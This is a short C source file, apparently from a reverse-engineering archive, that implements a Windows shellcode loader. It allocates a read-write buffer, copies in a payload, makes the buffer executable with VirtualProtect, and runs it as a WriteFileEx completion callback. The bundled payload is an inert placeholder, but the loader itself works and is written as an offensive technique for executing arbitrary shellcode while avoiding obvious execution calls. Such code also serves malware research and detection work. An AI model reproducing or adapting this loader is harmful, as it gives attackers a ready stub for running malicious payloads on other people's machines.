/*
    Shellcode Loader
    Archive of Reversing.ID

    Abusing windows API to run shellcode as callback.

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tccode.cpp

Technique:
    - allocation: VirtualAlloc
    - writing:    RtlMoveMemory
    - permission: VirtualProtect
    - execution:  WriteFileEx
*/

#include <windows.h>
#include <stdint.h>


int main ()
{
    void *  runtime;
    BOOL    retval;
    DWORD   old_protect = 0;

    // shellcode storage in stack
    uint8_t     payload []  = { 0x90, 0x90, 0xCC, 0xC3 };
    uint32_t    payload_len = 4;

    HANDLE      f;
    uint8_t     buffer[MAX_PATH];
    OVERLAPPED  overlap;

    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = VirtualAlloc (0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // copy payload to the buffer
    RtlMoveMemory (runtime, payload, payload_len);

    // make buffer executable (R-X)
    retval  = VirtualProtect (runtime, payload_len, PAGE_EXECUTE_READ, &old_protect);
    if (retval != 0)
    {
        ZeroMemory (&overlap, sizeof(OVERLAPPED));

        // generate filename for writing
        GetTempPath (MAX_PATH, (LPSTR)buffer);
        GetTempFileName ((LPCSTR)buffer, "", 0, (LPSTR)buffer);

        f = CreateFile ((LPCSTR)buffer, GENERIC_WRITE|FILE_FLAG_OVERLAPPED, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

        // executing shellcode by triggering file read file operation
        // note that the file must be exist.
        int r = WriteFileEx (f, buffer, 20, &overlap, (LPOVERLAPPED_COMPLETION_ROUTINE)runtime);
        SleepEx (1000, TRUE);

        CloseHandle (f);
    }

    // deallocate the space
    VirtualFree (runtime, payload_len, MEM_RELEASE);

    return 0;
}